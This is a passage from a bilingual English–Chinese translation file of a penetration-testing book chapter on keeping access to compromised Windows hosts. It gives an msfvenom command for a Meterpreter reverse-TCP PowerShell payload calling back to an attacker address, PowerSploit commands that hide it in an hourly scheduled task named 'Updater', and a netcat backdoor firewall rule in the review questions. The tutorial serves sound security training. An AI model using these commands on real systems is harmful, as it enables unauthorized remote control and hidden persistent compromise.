  zh: 现在，我们需要在 PowerShell 中安装持久化模块。我们所要做的就是将新获取的**Persistence**文件夹移动到我们系统上的 PowerShell
    模块路径中。启动 PowerShell，并用**$Env:PSModulePath**显示**PSModulePath**环境变量：
- en: '![Figure 17.13 – Confirming the module path ](image/Figure_17.13_B17616.jpg)'
  id: totrans-97
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.13 – 确认模块路径](image/Figure_17.13_B17616.jpg)'
- en: Figure 17.13 – Confirming the module path
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.13 – 确认模块路径
- en: Just do an ordinary cut and paste of the **Persistence** folder to your module
    path. You should see the other installed modules in this location as well.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 只需像平常一样剪切并粘贴**Persistence**文件夹到你的模块路径中。你应该能在这个位置看到其他已安装的模块。
- en: 'Slow down. Don’t pop the cork on that champagne just yet. If you’re using a
    freshly installed Windows VM as your attacker, you probably have a restricted
    execution policy set for PowerShell. We’ll want to open it up with **Set-ExecutionPolicy
    -ExecutionPolicy Unrestricted**. Then, we can import our new fancy module with
    **Import-Module Persistence**. You’ll be prompted for permission to become an
    evil hacker. The default is **Do not run**, so make sure to pass **R** to the
    command prompt. When you’re all done, you can fire up the **Get-Help** cmdlet,
    as you would for any old module:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 放慢节奏。不要急着打开香槟。如果你使用的是刚安装好的 Windows 虚拟机作为攻击者，可能会为 PowerShell 设置了受限的执行策略。我们需要用**Set-ExecutionPolicy
    -ExecutionPolicy Unrestricted**来打开它。然后，我们可以通过**Import-Module Persistence**导入我们新的高级模块。你将会被提示授权成为一个恶意黑客。默认选项是**不运行**，所以请确保在命令提示符下输入**R**。完成所有操作后，你可以像使用任何其他模块一样，启动**Get-Help**
    cmdlet：
- en: '![Figure 17.14 – The persistence module help screen ](image/Figure_17.14_B17616.jpg)'
  id: totrans-101
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.14 – 持久化模块帮助屏幕](image/Figure_17.14_B17616.jpg)'
- en: Figure 17.14 – The persistence module help screen
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.14 – 持久化模块帮助屏幕
- en: See how there are three scripts here? They work together to build a single payload.
    Let’s get started building our own.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 看到这儿有三个脚本吗？它们一起协作构建一个单一的有效载荷。让我们开始构建我们自己的。
- en: Configuring and executing Meterpreter persistence
  id: totrans-104
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 配置和执行 Meterpreter 持久化
- en: 'Now, we’re ready to build our gift to share with the world. First, we need
    to understand how these three scripts work. They’re not individual tools that
    you pick and choose from as needed; they are all *one* tool. To create any persistent
    script, you’ll need to run all three in a particular order:'
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经准备好构建要与世界分享的礼物。首先，我们需要理解这三个脚本是如何工作的。它们不是可以根据需要挑选的独立工具；它们是*一个*工具。要创建任何持久化脚本，你需要按特定的顺序运行这三个脚本：
- en: '**New-UserPersistenceOption** and **New-ElevatedPersistenceOption** must be
    executed first. The order doesn’t matter as long as it’s before the final script,
    **Add-Persistence**. These two scripts are used to define the persistence specifics
    that will make it into the final product. Why two? Because you’re telling your
    payload how to handle being either a standard user or a privileged user. Perhaps
    you want to configure these settings differently, depending on whether an administrator
    runs it or not. For now, we’ll just make the settings the same for both.'
  id: totrans-106
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**New-UserPersistenceOption**和**New-ElevatedPersistenceOption**必须首先执行。顺序无关紧要，只要它们在最后一个脚本**Add-Persistence**之前执行。这两个脚本用于定义将进入最终产品的持久化细节。为什么是两个？因为你要告诉有效载荷如何处理作为标准用户或特权用户的情况。也许你想根据管理员是否运行它来配置这些设置。现在，我们就先将设置设为相同。'
- en: '**Add-Persistence** needs the configuration defined in the first two scripts.
    These are passed to **Add-Persistence** as environment variables of your choosing.'
  id: totrans-107
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Add-Persistence**需要在前两个脚本中定义的配置。这些作为环境变量传递给**Add-Persistence**，由你选择。'
- en: Clear as mud? Let’s dive in. First, we need a payload. What’s nice about this
    is that any old PowerShell script will do fine. Maybe you have a favorite from
    our earlier review of PowerShell. Perhaps you typed up your own. For now, we’ll
    generate an example with the ever-useful **msfvenom**. One of the format options
    is PowerShell!
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 明白了吗？让我们深入了解。首先，我们需要一个有效载荷。幸运的是，任何旧的PowerShell脚本都可以很好地工作。也许你有一个喜欢的脚本，来自我们之前回顾的PowerShell。也许你自己写过一个。现在，我们将使用超级有用的**msfvenom**生成一个示例。它的格式选项之一就是PowerShell！
- en: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.154.131 LPORT=8008
    -f psh > attack.ps1
  id: totrans-109
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.154.131 LPORT=8008
    -f psh > attack.ps1
- en: 'I ended up with a 2.5 KB payload – not too shabby:'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 我最后得到了一个2.5 KB的有效载荷——还不错：
- en: '![Figure 17.15 – Preparing our payload and delivering it ](image/Figure_17.15_B17616.jpg)'
  id: totrans-111
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.15 – 准备我们的有效载荷并交付它](image/Figure_17.15_B17616.jpg)'
- en: Figure 17.15 – Preparing our payload and delivering it
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.15 – 准备我们的有效载荷并交付它
- en: Get that script to your *script builder* system (I used **SimpleHTTPServer**
    again; I just love that thing). Don’t take it to your target; we don’t have our
    persistent script just yet. Remember, if you only have access to one Windows box,
    your script builder and target are the same system.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 将那个脚本传输到你的*脚本构建器*系统上（我再次使用了**SimpleHTTPServer**；我真是太喜欢它了）。不要把它带到目标上；我们还没有我们的持久性脚本。记住，如果你只有一台Windows主机，那么你的脚本构建器和目标是同一台系统。
- en: 'Now, we run the three scripts – the two option scripts with output stored as
    environment variables, and then the persistence script with the options pulled
    in and the payload script defined:'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们运行这三个脚本——两个选项脚本，其输出存储为环境变量，然后是持久性脚本，它将选项传入并定义有效载荷脚本：
- en: $userop = New-UserPersistenceOption -ScheduledTask -Hourly
  id: totrans-115
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $userop = New-UserPersistenceOption -ScheduledTask -Hourly
- en: $suop = New-ElevatedPersistenceOption -ScheduledTask -Hourly
  id: totrans-116
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $suop = New-ElevatedPersistenceOption -ScheduledTask -Hourly
- en: Add-Persistence -FilePath .\attack.ps1 -ElevatedPersistenceOption $suop -UserPersistenceOption
    $userop
  id: totrans-117
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Add-Persistence -FilePath .\attack.ps1 -ElevatedPersistenceOption $suop -UserPersistenceOption
    $userop
- en: 'Check out the file sizes of the scripts that the persistence module spits out:'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 查看持久性模块输出的脚本文件大小：
- en: '![Figure 17.16 – The payload is packed and ready ](image/Figure_17.16_B17616.jpg)'
  id: totrans-119
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.16 – 有效载荷已打包并准备就绪](image/Figure_17.16_B17616.jpg)'
- en: Figure 17.16 – The payload is packed and ready
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.16 – 有效载荷已打包并准备就绪
- en: You can run **ls** or **dir** when you’re done to verify that it worked. You
    should see two new scripts – **Persistence.ps1** and **RemovePersistence.ps1**.
    The latter is for cleaning up your mess, should you need it. This will be important
    in a pen test, so don’t lose that file! Get **Persistence.ps1** over to your target.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 运行**ls**或**dir**来验证它是否成功。你应该看到两个新的脚本——**Persistence.ps1**和**RemovePersistence.ps1**。后者是为了在你需要时清理你的烂摊子。这在渗透测试中非常重要，所以不要丢了那个文件！把**Persistence.ps1**传到你的目标上。
- en: As always, the next step is waiting for our loyal package to start reporting
    in. Let’s look at getting it executed and verified.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 和往常一样，下一步是等待我们的忠实包开始报告。让我们来看一下如何执行和验证它。
- en: Lying in wait – verifying persistence
  id: totrans-123
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 潜伏等待 – 验证持久性
- en: 'Execute **Persistence.ps1** on your target (how you accomplish this is limited
    only by your imagination, tiny grasshopper). That’s it. No explosions. No confetti.
    So, let’s see what actually happened behind the scenes. Pull up **Task Scheduler**
    on the target system:'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 在目标上执行**Persistence.ps1**（如何完成这一步仅受你想象力的限制，小小的草蜢）。就这样。没有爆炸，没有五彩纸屑。那么，让我们看看幕后到底发生了什么。打开目标系统上的**任务计划程序**：
- en: '![Figure 17.17 – Task Scheduler on the target ](image/Figure_17.17_B17616.jpg)'
  id: totrans-125
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.17 – 目标上的任务计划程序](image/Figure_17.17_B17616.jpg)'
- en: Figure 17.17 – Task Scheduler on the target
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.17 – 目标上的任务计划程序
- en: Among the tasks scheduled to run on this system, note the little guy called
    **Updater**. It is designed to trigger a PowerShell script every hour. It says
    here that the next runtime is 2:30\. Well, it’s not quite that time yet, so I’ll
    reboot the target, grab some coffee, and relax, with Meterpreter listening for
    the songs of its people. In the meantime, let’s look at what the persistence script
    does.
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 在此系统上计划运行的任务中，请注意一个名为**Updater**的小家伙。它设计为每小时触发一次PowerShell脚本。这里说下一个运行时间是2:30。好吧，现在还不到这个时间，所以我将重启目标，去喝杯咖啡，放松一下，同时让Meterpreter监听它的“子民”的歌声。与此同时，让我们看看持久性脚本做了什么。
- en: 'Before we open up **Persistence.ps1** in the PowerShell ISE, let me show you
    the script in **Notepad** with **Word Wrap** enabled. I’ve highlighted the actual
    payload that’s getting persisted:'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们在 PowerShell ISE 中打开**Persistence.ps1**之前，让我先在启用了**自动换行**的**记事本**中展示该脚本。我已经标出正在持久化的实际有效载荷：
- en: '![Figure 17.18 – The payload packaged for task scheduling ](image/Figure_17.18_B17616.jpg)'
  id: totrans-129
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.18 – 为任务调度打包的有效载荷](image/Figure_17.18_B17616.jpg)'
- en: Figure 17.18 – The payload packaged for task scheduling
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.18 – 为任务调度打包的有效载荷
- en: 'It’s a compressed Base64 stream. Now, let’s take a look at the rest in the
    ISE:'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个压缩的 Base64 流。现在，让我们在 ISE 中查看其余内容：
- en: '![Figure 17.19 – The payload open for learning and tweaking ](image/Figure_17.19_B17616.jpg)'
  id: totrans-132
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.19 – 为学习和调整打开的有效载荷](image/Figure_17.19_B17616.jpg)'
- en: Figure 17.19 – The payload open for learning and tweaking
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.19 – 为学习和调整打开的有效载荷
- en: It won’t all fit on the page here, so I encourage you to study it and get an
    idea of what’s happening here. For example, check out the **$Payload** declaration
    – **schtasks /Create /SC HOURLY /TN Updater** (and so on). This will give you
    an idea of how the script ticks, but it’s also an opportunity for you to make
    your own tweaks as you deem necessary.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 这里的内容无法完全展示，因此我鼓励你仔细研究并理解其中的操作。例如，查看**$Payload**声明——**schtasks /Create /SC HOURLY
    /TN Updater**（依此类推）。这将帮助你了解脚本的工作原理，同时也为你提供了根据需要进行调整的机会。
- en: Summary
  id: totrans-135
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: In this chapter, we discovered ways of maintaining our access to the target
    systems once we’ve established ourselves on the network. This gives us more time
    to gather information and potentially deepen the compromise. We learned that modern
    threats are persistent, and so having these techniques in our repertoire as pen
    testers increases the value of the assessment to the client. We generated **msfvenom**
    payloads while explaining how to use more sophisticated payloads with these persistence
    tools. After exploring the persistence capabilities of both Metasploit and PowerShell
    Empire, we looked at quick and easy persistent backdoor building with netcat and
    Meterpreter Finally, we demonstrated the persistence module of the PowerSploit
    framework by taking a script and embedding it in code that persists the payload
    on the target.
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们探索了在成功建立网络访问后，如何保持对目标系统的访问。这样我们就有更多时间收集信息，并可能加深入侵。我们了解到现代威胁是持久性的，因此作为渗透测试人员，将这些技巧纳入我们的技能库，能够增加评估对客户的价值。我们在解释如何使用更复杂的有效载荷与这些持久化工具时，生成了**msfvenom**有效载荷。我们还探讨了
    Metasploit 和 PowerShell Empire 的持久化能力，了解了通过 netcat 和 Meterpreter 快速轻松地构建持久化后门。最后，我们展示了
    PowerSploit 框架的持久化模块，通过将脚本嵌入代码中，使有效载荷在目标上保持持久化。
- en: If you’re still awake, congratulations – you’ve made it to the end of our journey!
    But as I’ve said before, we’ve only dipped our toes in these refreshing waters.
    If you’d like to dive in, consider signing up for **Hack The Box**, the premier
    hacker training playground on the internet. You can work your way up from beginner
    to advanced, participate in the Academy to get some online training courses, and
    head back into the fray to practice your new skills. The entire process is gamified,
    so it’s both easy to track your progress and fun.
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你还清醒的话，恭喜你——你已经完成了我们的旅程！但正如我之前所说，我们只是刚刚涉足了这些清新的水域。如果你想深入探索，可以考虑注册**Hack The
    Box**，这是互联网上顶级的黑客训练平台。你可以从初学者开始，逐步提升到高级水平，参与学院课程获取在线培训，并返回战场实践新技能。整个过程是游戏化的，因此既容易跟踪进度，又充满乐趣。
- en: That’s great for practice, fun, and getting trained up – but if you’re looking
    for enterprise-grade training with a truly challenging certification process to
    bolster your résumé, who better than the actual creators of Kali? Head over to
    Offensive Security for both introductory and advanced training courses, plus Proving
    Grounds to try your hand with your new skills.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 这非常适合练习、娱乐和培训，但如果你在寻找企业级的培训，并且希望通过真正具有挑战性的认证过程来增强简历，那还得是 Kali 的实际创造者。前往 Offensive
    Security 获取入门级和高级培训课程，还可以通过 Proving Grounds 试验新技能。
- en: Those are two great resources, but the final word is that the true spirit and
    driving force of hacking isn’t something you buy – it’s an attitude, a lifestyle,
    and a way of approaching problems, on a computer and elsewhere in life. Whatever
    drove you to pick up this book is what you need to keep going down this path,
    so foster it, and prepare yourself for a truly rewarding career and hobby.
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 那些是两个很棒的资源，但最终的结论是，黑客的真正精神和推动力不是你能买到的东西——它是一种态度、一种生活方式，以及解决问题的方式，无论是在电脑上还是生活中的其他方面。促使你拿起这本书的动力就是你继续走这条路所需要的东西，所以培养它，并为一个真正充实的职业和爱好做好准备。
- en: Questions
  id: totrans-140
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 问题
- en: 'Answer the following questions to test your knowledge of this chapter:'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 回答以下问题以测试你对本章内容的掌握情况：
- en: The **persistence_exe** module works by adding a value in the _________.
  id: totrans-142
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**persistence_exe** 模块通过在 _________ 中添加一个值来工作。'
- en: What does the **msfvenom** flag **-f psh** mean?
  id: totrans-143
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**msfvenom** 标志 **-f psh** 是什么意思？'
- en: 'The PowerSploit Persistence module scripts must be run in this order: 1) **New-UserPersistenceOption**,
    2) **New-ElevatedPersistenceOption**, and 3) **Add-Persistence** – true or false?'
  id: totrans-144
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: PowerSploit 持久化模块脚本必须按以下顺序运行：1）**New-UserPersistenceOption**，2）**New-ElevatedPersistenceOption**，3）**Add-Persistence**
    – 对还是错？
- en: A hacker has uploaded and persisted netcat on a compromised Windows Server 2008
    box. They then run this command to allow their connections into the backdoor – **netsh
    advfirewall firewall add rule name="WindowsUpdate" dir=out action=allow protocol=TCP
    localport=9009**. They can’t connect to their backdoor. Why?
  id: totrans-145
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一个黑客在一个被攻陷的 Windows Server 2008 服务器上上传并持久化了 netcat。然后，他们运行此命令以允许他们的连接进入后门 –
    **netsh advfirewall firewall add rule name="WindowsUpdate" dir=out action=allow
    protocol=TCP localport=9009**。他们无法连接到后门。为什么？
- en: Permanent WMI subscriptions run as _____.
  id: totrans-146
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 永久 WMI 订阅以 _____ 方式运行。
- en: In Metasploit, a **.rc** file is a _________.
  id: totrans-147
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 Metasploit 中，**.rc** 文件是一个 _________。
- en: '**HKEY_LOCAL_MACHINE** is shorted to ________ when using **reg setval**.'
  id: totrans-148
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用 **reg setval** 时，**HKEY_LOCAL_MACHINE** 缩写为 ________。
- en: Further reading
  id: totrans-149
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 进一步阅读
- en: 'For more information regarding the topics that were covered in this chapter,
    take a look at the following resources:'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 关于本章涉及的主题，查看以下资源获取更多信息：
- en: A TechNet article on launching scripts with a WMI subscription: [https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript/](https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript/)
  id: totrans-151
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一篇关于使用 WMI 订阅启动脚本的 TechNet 文章：[https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript/](https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript/)
- en: PowerSploit GitHub with details about scripts: [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
  id: totrans-152
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: PowerSploit GitHub 上关于脚本的详细信息：[https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
